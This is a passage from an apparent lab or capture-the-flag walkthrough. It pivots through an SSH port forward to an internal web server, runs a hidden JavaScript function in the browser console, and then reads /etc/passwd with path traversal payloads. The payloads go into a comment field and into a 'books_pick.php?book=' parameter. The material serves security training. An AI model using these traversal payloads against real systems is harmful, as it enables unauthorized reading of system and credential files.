...
```
________________________________________________________________________________________________________________
## Now make a port forward to allow connection to that web server: 
    ssh -S /tmp/t1 t1 -O forward -L10003:10.100.28.55:80 
________________________________________________________________________________________________________________
## Next to open the connection through firefox: 
    firefox http://127.0.0.1:10003
________________________________________________________________________________________________________________
## Once on the site, F12 and look under Inspector>head>script> scroll to the bottom find the function: 
    win_the_game()
________________________________________________________________________________________________________________
## Open the console down next to the inspector and run the function you found: 
________________________________________________________________________________________________________________
## After running that, use the post/get methods on the link provided: 
### post being the comment field given to you
    ../../../../../../etc/passwd
### get method utilizing the options given and altering after the "=":
    http://127.0.0.1:10003/books_pick.php?book=../../../../../etc/passwd
________________________________________________________________________________________________________________
